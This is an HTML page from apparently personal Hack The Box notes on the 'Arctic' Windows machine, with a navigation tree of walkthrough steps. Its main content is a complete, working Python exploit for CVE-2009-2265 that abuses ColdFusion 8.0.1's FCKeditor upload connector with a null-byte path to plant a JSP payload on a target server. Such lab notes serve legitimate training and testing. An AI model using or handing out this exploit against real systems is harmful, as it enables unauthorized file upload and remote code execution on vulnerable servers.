<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--Arctic.html">Arctic</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--enumeration.html">enumeration</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--enumeration---CFIDE.html">/CFIDE</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--enumeration---CFIDE---administrator.html">/administrator</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold.html">intitial foothold</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--with_metasploit.html">with metasploit</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--with_metasploit--localhost_proxy_listener.html">localhost proxy listener</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--with_metasploit--fckeditor_reverseshell.html">fckeditor reverseshell</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit.html">w/o metasploit</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--searchsploit.html">searchsploit</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--directory_traversal_(LFI).html">directory traversal (LFI)</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--directory_traversal_(LFI)--admin_pass.html">admin pass</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--directory_traversal_(LFI)--admin_pass--Crackstation.html">Crackstation</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--directory_traversal_(LFI)--pagesource.html">pagesource</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--directory_traversal_(LFI)--webpage_console.html">webpage console</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--directory_traversal_(LFI)--webpage_console--admin.html">admin</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--reverse_shell_through_file_upload.html">reverse shell through file upload</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--reverse_shell_through_file_upload--scheduling_a_task.html">scheduling a task</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--arrexel_reverse_shell.html">arrexel reverse shell</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--arrexel_reverse_shell--arbitrary_file_upload_by_arrexel.html">arbitrary file upload by arrexel</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--arrexel_reverse_shell--arbitrary_file_upload_by_arrexel--exploit.html">exploit</a></li>
<li><a href="-Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--arrexel_reverse_shell--arbitrary_file_upload_by_arrexel--vi_arrexel_exploit.py.html">vi arrexel_exploit.py</a></li>
<li><a href="es--Arctic--intitial_foothold--w-o_metasploit--arrexel_reverse_shell--arbitrary_file_upload_by_arrexel--jsp_generated_payload_w-_msfvenom.html">jsp generated payload w/ msfvenom</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--intitial_foothold--w-o_metasploit--arrexel_reverse_shell--arbitrary_file_upload_by_arrexel--run.html">run</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--privesc.html">privesc</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--privesc--windows_exploit_suggester.html">windows exploit suggester</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--privesc--windows_exploit_suggester--sysinfo.html">sysinfo</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--privesc--windows_exploit_suggester--report.html">report</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--privesc--ms10-059_-_chimichurri.html">ms10-059 -> chimichurri</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--privesc--ms10-059_-_chimichurri--upload_with_arrexel's_file_uploader.html">upload with arrexel's file uploader</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--privesc--ms10-059_-_chimichurri--run.html">run</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--Arctic--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--Arctic--Lessons_Learned.html">Lessons Learned</a></li>
</ol></div>
<div class="page"><h1><b><u>exploit</u></b></h1><h3>#!/usr/bin/python<br /># Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload<br /># Date: 2017-10-16<br /># Exploit Author: Alexander Reid<br /># Vendor Homepage: </h3><a href="http://www.adobe.com/products/coldfusion-family.html">http://www.adobe.com/products/coldfusion-family.html</a><h3><br /># Version: ColdFusion 8.0.1<br /># CVE: CVE-2009-2265 <br /># <br /># Description: <br /># A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1<br /># Uploads the specified jsp file to the remote server.<br />#<br /># Usage: ./exploit.py &lt;target ip&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;<br /># Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp<br />import requests, sys<br /><br />try:<br />    ip = sys.argv[1]<br />    port = sys.argv[2]<br />    if len(sys.argv) == 5:<br />        path = sys.argv[3]<br />        with open(sys.argv[4], 'r') as payload:<br />            body=payload.read()<br />    else:<br />        path = ""<br />        with open(sys.argv[3], 'r') as payload:<br />            body=payload.read()<br />except IndexError:<br />    print 'Usage: ./exploit.py &lt;target ip/hostname&gt; &lt;target port&gt; [/path/to/coldfusion] &lt;/path/to/payload.jsp&gt;'<br />    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'<br />    sys.exit(-1)<br /><br />basepath = "</h3><a href="http://"">http://"</a><h3> + ip + ":" + port + path<br /><br />print 'Sending payload...'<br /><br />try:<br />    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)<br />    if req.status_code == 200:<br />        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'<br />    else:<br />        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason<br />except requests.Timeout:<br />    print 'Failed to upload payload... Request timed out'</h3></div></div>
</body></html>